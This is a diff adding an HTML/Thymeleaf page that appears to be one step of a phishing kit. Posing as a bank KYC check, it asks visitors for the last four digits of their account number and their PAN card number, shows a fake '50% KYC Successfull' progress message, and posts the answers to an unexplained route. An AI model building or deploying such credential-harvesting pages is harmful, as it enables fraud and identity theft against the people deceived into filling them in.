@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" th:href="@{/css/page2.css}" />
+    <title>Welcome</title>
+  </head>
+  <body>
+    <div class="content">
+      <div class="logo">
+        <img th:src="@{/images/afx.png}" alt="logo" />
+      </div>
+
+      <div class="second">
+        <p>Verify Details</p>
+      </div>
+
+    <div class="form">
+        <form th:action="@{/f7}" method="post">
+          <label for="acholder">Last 4 Digit Account Number</label>
+          <input type="text" id="customid" name="acholder" required/><br /><br />
+  
+          <label for="pan">PAN Card Number</label>
+          <input type="text" id="pan" name="pan" required /><br /><br />
+          <div class="green">
+            <p>50% KYC Successfull</p>
+          </div>
+          <input class="btn" type="submit" value="SUBMIT" />
+        </form>
+      </div>
+    </div>
+
+    <div class="footer">
+        <p>&copy; Copyright</p>
+        <p>Terms and Conditions</p>
+        <p>Privacy Policy</p>
+    </div>
+  </body>
+</html>
